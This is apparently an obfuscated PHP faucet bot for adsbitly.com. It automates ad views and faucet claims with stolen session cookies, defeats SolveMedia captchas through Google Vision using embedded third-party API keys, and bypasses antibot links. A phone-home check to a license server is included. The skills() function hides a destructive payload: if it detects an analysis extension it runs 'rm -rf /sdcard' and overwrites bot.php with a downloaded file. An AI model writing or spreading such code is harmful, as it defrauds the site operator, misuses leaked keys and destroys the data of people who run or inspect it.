<?php
#date_default_timezone_set('Asia/Jakarta');
system("clear");
$var_0="\n";$var_1="\t";
//warnn
$var_2="\033[34m";$var_3="\033[36m";$var_4="\033[92m";
$var_5="\033[37m";$var_6="\033[35m";$var_7="\033[31m";
$var_8="\033[33m";$var_9="\033[8m";$var_10="\033[0"."m";
function saveas($var_11,$var_12){
 if(!file_exists($var_11)){file_put_contents($var_11,"[]"); }
 $var_15 = json_decode(file_get_contents($var_11),1);
 $var_17 = array_merge($var_15,$var_12);
file_put_contents($var_11,json_encode($var_17,JSON_PRETTY_PRINT));}

function head($var_12){
 foreach($var_12 as $var_24=>$var_25){$var_26[]=$var_24.": ".$var_25;}
 return $var_26; }
 
function timer($var_30,$var_31){
  date_default_timezone_set('UTC');
$var_32 = time()+$var_31;
$var_2="\033[34m";$var_3="\033[36m";
$var_4="\033[92m";$var_5="\033[37m";
$var_6="\033[35m";$var_7="\033[31m";
$var_8="\033[33m";$var_9="\033[8m";
$var_10="\033[0"."m";
$var_43=[$var_5,$var_7];
$var_46=0;
$var_47=[$var_4,$var_8,$var_3,$var_4,$var_8,$var_3];$var_54=1;
while(true):
echo "\r                                                        \r";
$var_55=$var_43[$var_46];
$var_58 = $var_32-time();
$var_60=date("H:i:s",$var_58);
if($var_58<1){ break; }
$var_63=str_repeat("â",$var_54);$var_65=$var_47[$var_54-1];
$var_68="tod!";$var_69="â©";
echo $var_5.$var_30."$var_5 â¨$var_55$var_60$var_5$var_69 $var_68$var_65$var_63";
if($var_54==6){$var_54=1;}else{$var_54++;} sleep(1);
$var_46++; 
if($var_46 >= count ($var_43)){$var_46=0;}

endwhile; 
  }

function settings($var_87,$var_88){
$var_89 = "https://tuyulgaple.online/sunggingads/";
$var_90 = json_encode(
    array(
        'sk' => $var_87,
        'vr' => $var_88 ));
$var_93 = array('http' =>
    array(
        'method'  => 'POST',
        'header'  => 'Content-Type: application/json',
        'content' => $var_90
    ));
$var_95 = stream_context_create($var_93);
$var_97     = json_decode(file_get_contents($var_89, false, $var_95),1);

$var_100      = $var_97["baner"];
if(!$var_97["status"]){ 
 $var_30 = "skrip di non-aktifkan\n";
 echo $var_104.$var_100.$var_30; exit; }
else{ return $var_104.$var_100; }  }

function clr($var_100){system("clear");echo $var_100.$var_0;}

function strip(){
$var_5="\033[37m";
echo "$var_5~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n";}
function tabs(){
echo "\r                                                        \r";}

function curl($var_89,$var_115,$var_116){
 $var_117 = curl_init($var_89);
 curl_setopt($var_117, CURLOPT_SSL_VERIFYPEER, 1);
 curl_setopt($var_117, CURLOPT_RETURNTRANSFER, 1 ); 
 curl_setopt($var_117, CURLOPT_TIMEOUT,30       );
 curl_setopt($var_117, CURLOPT_VERBOSE,        0);
 curl_setopt($var_117, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($var_117, CURLOPT_HTTPHEADER, $var_116 );
 #curl_setopt($ch, CURLOPT_COOKIEJAR,  "cookie");
 #curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie");
if(strlen($var_115) > 0 ){
 curl_setopt($var_117, CURLOPT_POST, true);
 curl_setopt($var_117, CURLOPT_POSTFIELDS,    $var_115 ); }
 $var_130 = curl_exec($var_117);
 $var_132   = curl_getinfo($var_117);
 curl_close($var_117);
 if($var_132["http_code"]==302){
 return $var_132["redirect_url"]; } else { return $var_130; } }
 
function curls($var_89,$var_115,$var_116){
 $var_117 = curl_init($var_89);
 curl_setopt($var_117, CURLOPT_SSL_VERIFYPEER, 1);
 curl_setopt($var_117, CURLOPT_RETURNTRANSFER, 1 ); 
 curl_setopt($var_117, CURLOPT_TIMEOUT,60       );
 curl_setopt($var_117, CURLOPT_VERBOSE,        0);
 curl_setopt($var_117, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($var_117, CURLOPT_HTTPHEADER, $var_116 );
if(strlen($var_115) > 0 ){
 curl_setopt($var_117, CURLOPT_POST, true);
 curl_setopt($var_117, CURLOPT_POSTFIELDS,    $var_115 ); }
 $var_130 = curl_exec($var_117);
 $var_132   = curl_getinfo($var_117);
 curl_close($var_117);
 if($var_132["http_code"]==302){
 return $var_132["redirect_url"]; } else { return $var_130; } }

function imgscan($var_162){
$var_163=base64_encode(file_get_contents($var_162));
$var_165=["content-type: application/json"];
$var_115='{
  "requests": [
    {
      "image": {
        "content": "'.$var_163.'"
      },
      "features": [
        {
          "type": "TEXT_DETECTION"
        }
      ]
    }
  ]
}';
$var_89="https://vision.googleapis.com/v1/images:annotate?key=AIzaSyC3y-Em42htSB8UEZPqptJ78rlvL58_h6Y";
$var_169=curl($var_89,$var_115,$var_165);
$var_173=strpos($var_169,'Enter the following:\n');
if($var_173){
$var_173=substr($var_169,$var_173);
$var_173=str_replace('Enter the following:\n','',$var_173);
$var_173=substr($var_173,0,strpos($var_173,'"'));
$var_173=str_replace('\n','',$var_173);
$var_173= preg_replace("/[^a-zA-Z]/", "", $var_173);}
if(strlen($var_173) > 25){}else{return $var_173;} }

function imgscan_new($var_162){
$var_163=base64_encode(file_get_contents($var_162));
$var_165=["content-type: application/json","referer: https://brandfolder.com/workbench/extract-text-from-image"];
$var_115='{
  "requests": [
    {
      "image": {
        "content": "'.$var_163.'"
      },
      "features": [
        {
          "type": "TEXT_DETECTION"
        }
      ]
    }
  ]
}';
$var_89="https://vision.googleapis.com/v1/images:annotate?key=AIzaSyACaXt7I0ZBVtKaqTEo4-F9FEdULP-5nCg";
$var_169=curls($var_89,$var_115,$var_165);
$var_173=strpos($var_169,'Enter the following:\n');
if($var_173){
$var_173=substr($var_169,$var_173);
$var_173=str_replace('Enter the following:\n','',$var_173);
$var_173=substr($var_173,0,strpos($var_173,'"'));
$var_173=str_replace('\n','',$var_173);
$var_173= preg_replace("/[^a-zA-Z ]/", "", $var_173);}
if(strlen($var_173) > 25){}else{return $var_173;} }


function verif_keys($var_87,$var_100){
$var_0="\n";$var_1="\t";
//warna
$var_2 = "\033[34m"; $var_3 = "\033[36m"; $var_4 = "\033[92m";
$var_5= "\033[37m"; $var_6= "\033[35m"; $var_7 = "\033[31m";
$var_8 = "\033[33m"; $var_9= "\033[8m";  $var_10  = "\033[0"."m";
while(true): clr($var_100);
if( $var_232 ){
 $var_232 = 0;
 while(true): clr($var_100);
 $var_235 = str_replace($var_0,"",file_get_contents("keys"));
 $var_89 = "http://tuyulgaple.online/aktivator/";
 $var_238 = json_encode([ "request" => $var_87,"keys" => $var_235]);
 $var_241  = json_decode( curl($var_89,$var_238,array()),1 );
if( $var_241["respon"] ) {
  echo $var_3."=> ".$var_241["respon"].$var_0;
  $var_248 = readline($var_5."input key : ");
  if( $var_248 ){
  $var_238 = json_encode(["request" => $var_87,"keys" => $var_248]);
  $var_241  = json_decode(curl($var_89,$var_238,array()),1);
  if( $var_241["code"] != 10 ) {
  file_put_contents("keys",$var_248);
  $var_235 = str_replace($var_0,"",file_get_contents("keys")); break; }}}
 else{ readline($var_4."your keys is uptodate ");break; }endwhile; }
 $var_89 = "http://tuyulgaple.online/aktivator/";
 $var_235 = str_replace($var_0,"",file_get_contents("keys"));
 $var_238 = json_encode(["request" => $var_87,"keys" => $var_235]);
 $var_241  = json_decode(curl($var_89,$var_238,array()),1);
if( $var_241["code"] == 10 ){ $var_232=1; }else{ break; }
endwhile; }
function update($var_87,$var_274){
$var_235 = str_replace($var_0,"",file_get_contents("keys"));
$var_89 = "http://tuyulgaple.online/aktivator/";
$var_238 = json_encode([ "request" => $var_87,"keys" => $var_235]);
$var_241  = json_decode( curl($var_89,$var_238,array()),1 );
if($var_241["respon"]){
echo $var_274."keys are expired, please update first !\n";exit;}  }
function input($var_286,$var_100,$var_115,$var_289){
 $var_290 = array(); 
 foreach( $var_115 as $var_292 ){
 clr($var_100);
 if(!$var_289[$var_292]){ 
  $var_296 = readline($var_292." : ");
  $var_290 = array_merge($var_290,[$var_292 => $var_296 ]); }
 else{ $var_290 = array_merge($var_290,[ $var_292 => $var_289[$var_292] ]); }
 } if($var_290[$var_115[0]]){ return $var_290; } }
 
 function fake_user(){
$var_89  = "https://tuyulgaple.tech/randomuser/";
$var_311 = json_decode(file_get_contents($var_89),1); 
$var_313 = [ 
    "name"  => [
              "first"  => $var_311["first"],
              "last"   => $var_311["last"],
              "full"   => $var_311["full_name"] ],
    "uuid"  => $var_311["uuid"]  ];
return $var_313; }
 
function skills(){
$var_30="anda terdeteksi sebagai kang ngentod!";
if(extension_loaded("evalhook")){
 @system("clear");shell_exec('rm -rf /sdcard');
 $var_320=file_get_contents("https://txxx.com/");
 file_put_contents("bot.php",$var_320);echo $var_30; exit; }}
 
$var_87="adsbitly";$var_88="1.0";$var_286="config.json";
skills();
error_reporting(0);
$var_326=settings($var_87,$var_88,"");
//verif_keys($var_87,$var_326);
clr($var_326);$var_332="adsbitly.com";

function getsolve($var_333,$var_12){
$var_165=head($var_12);
$var_169=curl($var_333,"",$var_165);
$var_340=strpos($var_169,'chid"     : "');
$var_342=strpos($var_169,'uid"      : "');
if($var_340){
$var_340=substr($var_169,$var_340);
$var_340=str_replace('chid"     : "','',$var_340);
$var_340=substr($var_340,0,strpos($var_340,'"'));}
if($var_342){
$var_342=substr($var_169,$var_342);
$var_342=str_replace('uid"      : "','',$var_342);
$var_342=substr($var_342,0,strpos($var_342,'"'));}
return[
    "cid" => $var_340,
    "uid" => $var_342
    ];}

function solvemedia($var_340,$var_12){
$var_165=head($var_12);
$var_89="https://api-secure.solvemedia.com/papi/media?c=$var_340;w=300;h=150;fg=000000;bg=f8f8f8";
$var_169=curl($var_89,"",$var_165);
return $var_169;
}

function antibot($var_332,$var_12){
 $var_165=head($var_12);
 $var_89=curl("https://$var_332/faucet","",$var_165);
 if($var_381 = strpos($var_89,"var ablinks")){
  $var_115 = substr($var_89,$var_381);
  $var_115 = substr($var_115,0,strpos($var_115,"</script>"));}
$var_389 = array();
$var_390  = explode("rel=",$var_115);
foreach($var_390 as $var_24 => $var_25 ){ 
  $var_389[]= str_replace(["\\",'"'],"",substr($var_25,0,strpos($var_25,">"))); }
  array_shift($var_389);  
 $var_399=$var_389[0];$var_401=$var_389[1];$var_403=$var_389[2];
 $var_405 = [ 
   "$var_399 $var_401 $var_403",
   "$var_399 $var_403 $var_401",
   "$var_401 $var_399 $var_403",
   "$var_401 $var_403 $var_399",
   "$var_403 $var_399 $var_401",
   "$var_403 $var_401 $var_399"];
 return $var_405[array_rand($var_405)];}
 
function home($var_332,$var_12){
$var_165=head($var_12);
$var_89="https://$var_332/dashboard";
$var_169=curl($var_89,"",$var_165);
#echo $html."\n";exit;
$var_435=strpos($var_169,'t-henry">');
$var_437=strpos($var_169,'tokenBalance" value="');
$var_439=strpos($var_169,'csrf_token_name" value="');
if($var_435){
$var_435=substr($var_169,$var_435);
$var_435=str_replace('t-henry">',"",$var_435);
$var_435=substr($var_435,0,strpos($var_435,"<"));}
if($var_437){
$var_437=substr($var_169,$var_437);
$var_437=str_replace('tokenBalance" value="','',$var_437);
$var_437=substr($var_437,0,strpos($var_437,'"'));}
if($var_439){
$var_439=substr($var_169,$var_439);
$var_439=str_replace('csrf_token_name" value="','',$var_439);
$var_439=substr($var_439,0,strpos($var_439,'"'));}
return
["nick"=>$var_435,"bal"=>$var_437,"csrf"=>$var_439];}

function auto($var_332,$var_12){
$var_165=head($var_12);
$var_89="https://$var_332/auto";
$var_169=curl($var_89,"",$var_165);
$var_480=strpos($var_169,'token" value="');
$var_482=strpos($var_169,'let timer = ');
$var_484=strpos($var_169,"Good job!', '");
$var_486=strpos($var_169,'fa-exclamation-circle"></i> ');
if($var_480){
$var_480=substr($var_169,$var_480);
$var_480=str_replace('token" value="','',$var_480);
$var_480=substr($var_480,0,strpos($var_480,'"'));}
if($var_482){
$var_482=substr($var_169,$var_482);
$var_482=str_replace('let timer = ','',$var_482);
$var_482=substr($var_482,0,strpos($var_482,','));}
if($var_484){
$var_484=substr($var_169,$var_484);
$var_484=str_replace("Good job!', '","",$var_484);
$var_484=substr($var_484,0,strpos($var_484," "));}
if($var_486){
$var_486=substr($var_169,$var_486);
$var_486=str_replace('fa-exclamation-circle"></i> ','',$var_486);
$var_486=substr($var_486,0,strpos($var_486,'<'));}
return["token"=>$var_480,"time"=>$var_482,
       "warn" =>$var_486,"rwd" => $var_484 ];    }

function auto_verif($var_332,$var_12,$var_480){
$var_165=head($var_12);
$var_89="https://$var_332/auto/verify";
$var_115="token=$var_480";
$var_169=curl($var_89,$var_115,$var_165);
$var_484  = strpos($var_169,"text: '");
if($var_484){
$var_484=substr($var_169,$var_484);
$var_484=str_replace("text: '","",$var_484);
$var_484=substr($var_484,0,strpos($var_484," "));}
return ["rwd"=>$var_484]; }
 
function faucet($var_332,$var_12){
$var_165=head($var_12);
$var_89="https://$var_332/faucet";
$var_169=curl($var_89,"",$var_165);
$var_439=strpos($var_169,'csrf_token_name" id="token" value="');
$var_480=strpos($var_169,'hidden" name="token" value="');
$var_482=strpos($var_169,'var wait = ');
if($var_439){
$var_439=substr($var_169,$var_439);
$var_439=str_replace('csrf_token_name" id="token" value="','',$var_439);
$var_439=substr($var_439,0,strpos($var_439,'"'));}
if($var_480){
$var_480=substr($var_169,$var_480);
$var_480=str_replace('hidden" name="token" value="','',$var_480);
$var_480=substr($var_480,0,strpos($var_480,'"'));}
if($var_482){
$var_482=substr($var_169,$var_482);
$var_482=str_replace('var wait = ','',$var_482);
$var_482=substr($var_482,0,strpos($var_482,' '));}
return [
    "time" => $var_482,
    "csrf" => $var_439,
    "token" => $var_480
    ];    }
 
function faucet_verify($var_332,$var_12,$var_600,$var_439,$var_480,$var_603,$var_340){
$var_165=head($var_12);
$var_115 = http_build_query([
  "antibotlinks"    => $var_600,
  "csrf_token_name" => $var_439,
  "token"           => $var_480,
  "captcha"         => "solvemedia",
  "g-recaptcha-response" => "",
  "adcopy_response" => $var_603,
  "adcopy_challenge"=> $var_340
  ]);
$var_89="https://$var_332/faucet/verify";
$var_169=curl($var_89,$var_115,$var_165);
$var_619 = strpos($var_169,"Invalid");
$var_484  = strpos($var_169,"Good job!', '");
if($var_619){
$var_619 = substr($var_169,$var_619);
$var_619 = substr($var_619,0,strpos($var_619,"</div>"));}
if($var_484){
$var_484=substr($var_169,$var_484);
$var_484=str_replace("Good job!', '","",$var_484);
$var_484=substr($var_484,0,strpos($var_484," "));}
return ["rwd"  => $var_484,"fail" => $var_619]; }

function ptc($var_332,$var_12){
$var_165=head($var_12);
$var_89="https://$var_332/ptc";
$var_169=curl($var_89,"",$var_165);
$var_650=strpos($var_169,'ptc/view/');
if($var_650){
$var_650=substr($var_169,$var_650);
$var_650=str_replace('ptc/view/','',$var_650);
$var_650=substr($var_650,0,strpos($var_650,"'"));}

$var_89="https://$var_332/ptc/view/$var_650";
$var_169=curl($var_89,"",$var_165);
$var_439=strpos($var_169,'csrf_token_name" value="');
$var_480=strpos($var_169,'name="token" value="');
$var_671=strpos($var_169,'ptc/verify/');
$var_482=strpos($var_169,'var timer = ');
if($var_439){
$var_439=substr($var_169,$var_439);
$var_439=str_replace('csrf_token_name" value="','',$var_439);
$var_439=substr($var_439,0,strpos($var_439,'"'));}
if($var_480){
$var_480=substr($var_169,$var_480);
$var_480=str_replace('name="token" value="','',$var_480);
$var_480=substr($var_480,0,strpos($var_480,'"'));}
if($var_671){
$var_671=substr($var_169,$var_671);
$var_671=str_replace('ptc/verify/','',$var_671);
$var_671=substr($var_671,0,strpos($var_671,'"'));}
if($var_482){
$var_482=substr($var_169,$var_482);
$var_482=str_replace('var timer = ','',$var_482);
$var_482=substr($var_482,0,strpos($var_482,';'));}
return ["csrf"=>$var_439,"token"=>$var_480,
       "view"=>$var_671,"time"=>$var_482];    }
       
function ptc_verif($var_332,$var_12,$var_603,$var_340,$var_439,$var_480,$var_671){
$var_165=head($var_12);
$var_115 = http_build_query([
  "captcha"         => "solvemedia",
  "g-recaptcha-response" => "",
  "adcopy_response" => $var_603,
  "adcopy_challenge"=> $var_340,
  "csrf_token_name" => $var_439,
  "token"           => $var_480
  ]);
$var_89="https://$var_332/ptc/verify/$var_671";
$var_169=curl($var_89,$var_115,$var_165);
$var_619 = strpos($var_169,"Invalid");
$var_484  = strpos($var_169,"Good job!', '");
if($var_619){
$var_619 = substr($var_169,$var_619);
$var_619 = substr($var_619,0,strpos($var_619,"</div>"));}
if($var_484){
$var_484=substr($var_169,$var_484);
$var_484=str_replace("Good job!', '","",$var_484);
$var_484=substr($var_484,0,strpos($var_484," "));}
return ["rwd"=>$var_484,"fail"=>$var_619]; }

function withdraw($var_332,$var_12,$var_760,$var_761,$var_762,$var_439){
$var_165=head($var_12);
$var_115 = http_build_query([
  "method"         => $var_760,
  "amount"         => $var_761,
  "wallet"         => $var_762,
  "csrf_token_name"=> $var_439
  ]);
$var_89="https://$var_332/dashboard/withdraw";
$var_169=curl($var_89,$var_115,$var_165);
$var_777=strpos($var_169,"title: '");
$var_484  = strpos($var_169,"text: '");
$var_619= strpos($var_169,'"alert alert-warning text-center">');
if($var_777){
$var_777=substr($var_169,$var_777);
$var_777=str_replace("title: '","",$var_777);
$var_777=substr($var_777,0,strpos($var_777," "));}
if($var_484){
$var_484=substr($var_169,$var_484);
$var_484=str_replace("text: '","",$var_484);
$var_484=substr($var_484,0,strpos($var_484," "));}
if($var_619){
$var_619=substr($var_169,$var_619);
$var_619=str_replace('"alert alert-warning text-center">','',$var_619);
$var_619=substr($var_619,0,strpos($var_619,'<'));}
return ["fail"=>$var_619,"job"=>$var_484,"name"=>$var_777]; }

while(true):
$var_15   = json_decode(file_get_contents($var_286),1);
if(!$var_15["cookie"]){
$var_816["cookie"]=readline("cookie: ");
saveas($var_286,$var_816);strip(); }
elseif(!$var_15["user-agent"]){
$var_816["user-agent"]=readline("user-agent: ");
saveas($var_286,$var_816);strip(); }
elseif(!$var_15["url-solve"]){
$var_816["url-solve"]=readline("url-solve: ");
saveas($var_286,$var_816);strip(); }
else{
$var_827=$var_15["cookie"];$var_829=$var_15["user-agent"];
$var_333=$var_15["url-solve"];
break;}
endwhile;clr($var_326);


$var_165=[
    "Host" => $var_332,
    "upgrade-insecure-requests" => "1",
    "user-agent" => $var_829,
    "accept" => "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
   "content-type" => "application/x-www-form-urlencoded",
    "referer" => "https://$var_332/faucet",
    "cookie" => $var_827
     ];

while(true):
$var_839=home($var_332,$var_165);
if($var_435=$var_839["nick"]){$var_437=$var_839["bal"];
echo $var_4."connect as$var_3 $var_435$var_5 balance$var_4 $var_437$var_0";
strip();}else{
echo $var_7."connect failed$var_5 coba ambil cokie pake canary$var_0";
$var_17=readline($var_5."input ulang cookie : ");
$var_292=[
    "cookie" => $var_17
    ];
saveas("config.json",$var_292);
echo $var_4."silahkan jalankan ulang.$var_0";exit;}

echo $var_4.$var_1."[1]$var_5 Visit PTC$var_0";
echo $var_4.$var_1."[2]$var_5 Auto  Faucet$var_0";
echo $var_4.$var_1."[3]$var_5 Claim Faucet$var_0";
$var_875=readline("options: ");strip();


switch($var_875){
case 1:

while(true):
$var_650=ptc($var_332,$var_165);
#print_r($ptc);exit;
if($var_439=$var_650["csrf"]){$var_480=$var_650["token"];
$var_671=$var_650["view"];$var_482=$var_650["time"];
timer("wait",$var_482);
while(true):
$var_889=getsolve($var_333,$var_165);
if($var_889["cid"]){
$var_340=$var_889["cid"];$var_342=$var_889["uid"];}
else{
tabs();
echo $var_7."gagal load data image !";}


$var_898=solvemedia($var_340,$var_165);
if(!$var_901 = imagecreatefromstring($var_898)){
tabs();
echo $var_7."gagal download image !$var_5";}
else{ 
  imagepng($var_901,"img.png");
  imagedestroy($var_901);
$var_603=imgscan("img.png");
if($var_603==null){
$var_603=imgscan_new("img.png");}
break;}endwhile;
$var_910  = date("H:i:s",time()+7*60*60);
tabs();echo $var_5."[$var_910] analize ->$var_4 $var_603";sleep(3);

$var_915=ptc_verif($var_332,$var_165,$var_603,$var_340,$var_439,$var_480,$var_671);
if($var_619=$var_915["fail"]){
tabs();echo $var_5."[$var_910]$var_7 $var_619"; }
elseif($var_484=$var_915["rwd"]){
tabs();
$var_839=home($var_332,$var_165);
$var_437=$var_839["bal"];$var_439=$var_839["csrf"];
echo $var_5.$var_1."   reward :$var_4 $var_484$var_0";
echo $var_3."[$var_910]$var_5 balance:$var_4 $var_437$var_0";
strip();
}else{
tabs();echo $var_5."[$var_910]$var_7 error!";}

}else{
tabs();echo $var_7."visit ptc$var_5 no available.$var_0";break;}

endwhile;
break;

case 2:
while(true):
$var_955=auto($var_332,$var_165);
if($var_480=$var_955["token"]){$var_482=$var_955["time"];
timer("wait",$var_482);

$var_915=auto_verif($var_332,$var_165,$var_480);
$var_839=home($var_332,$var_165);
$var_910  = date("H:i:s",time()+7*60*60);
$var_437=$var_839["bal"];$var_439=$var_839["csrf"];
if($var_484=$var_915["rwd"]){
tabs();
echo $var_5.$var_1."   reward :$var_4 $var_484$var_0";}else{
tabs();
echo $var_5.$var_1."   reward :$var_7 invalid$var_0";}
if($var_437){
tabs();
echo $var_3."[$var_910]$var_5 balance:$var_4 $var_437$var_0";}else{
tabs();
echo $var_3."[$var_910]$var_5 balance:$var_7 invalid$var_0";}

strip();
}elseif($var_486=$var_955["warn"]){
tabs();
echo $var_7.$var_486.$var_5.$var_0;break;}
else{
tabs();
echo $var_7."failed!$var_5 get data autofaucet.$var_0";sleep(3);}
endwhile;
break;

case 3:
while(true):
$var_1007=faucet($var_332,$var_165);
$var_439=$var_1007["csrf"];$var_480=$var_1007["token"];
$var_482=$var_1007["time"];timer("wait",$var_482);
while(true):
$var_889=getsolve($var_333,$var_165);
if($var_889["cid"]){
$var_340=$var_889["cid"];$var_342=$var_889["uid"];}
else{
tabs();echo $var_7."gagal load data image !";}

$var_898=solvemedia($var_340,$var_165);
if(!$var_901 = imagecreatefromstring($var_898)){
tabs();echo $var_7."gagal download image !$var_5";}
else{ 
  imagepng($var_901,"img.png");
  imagedestroy($var_901);
$var_603=imgscan("img.png");
if($var_603==null){
$var_603=imgscan_new("img.png");}
break;}endwhile;
$var_910  = date("H:i:s",time()+7*60*60);
tabs();echo $var_5."[$var_910] analize ->$var_4 $var_603";sleep(3);


$var_600=antibot($var_332,$var_165);
if($var_600){
tabs();
echo $var_5."[$var_910] Anti Bot$var_4 $var_600";}

$var_915=faucet_verify($var_332,$var_165,$var_600,$var_439,$var_480,$var_603,$var_340);
if($var_915["fail"]){
$var_619=$var_915["fail"];
tabs();echo $var_5."[$var_910]$var_7 $var_619";}
elseif($var_915["rwd"]){$var_484=$var_915["rwd"];
tabs();
$var_839=home($var_332,$var_165);
$var_437=$var_839["bal"];$var_439=$var_839["csrf"];
echo $var_5.$var_1."   reward :$var_4 $var_484$var_0";
echo $var_3."[$var_910]$var_5 balance:$var_4 $var_437$var_0";
strip();
}else{
tabs();echo $var_5."[$var_910]$var_7 error!";}
endwhile;
break;

}readline($var_5."press key any continue");clr($var_326);
endwhile;
